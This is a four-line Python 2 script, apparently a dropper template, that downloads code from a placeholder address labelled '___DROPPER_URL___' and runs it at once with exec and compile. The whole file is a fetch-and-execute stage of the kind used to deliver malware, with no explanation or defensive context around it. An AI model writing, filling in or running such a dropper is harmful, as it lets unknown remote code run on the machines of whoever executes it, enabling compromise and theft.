#!/usr/bin/env python
import urllib2
fs = {}
exec compile( urllib2.urlopen( "___DROPPER_URL___" ).read(), "source", "exec" ) in fs
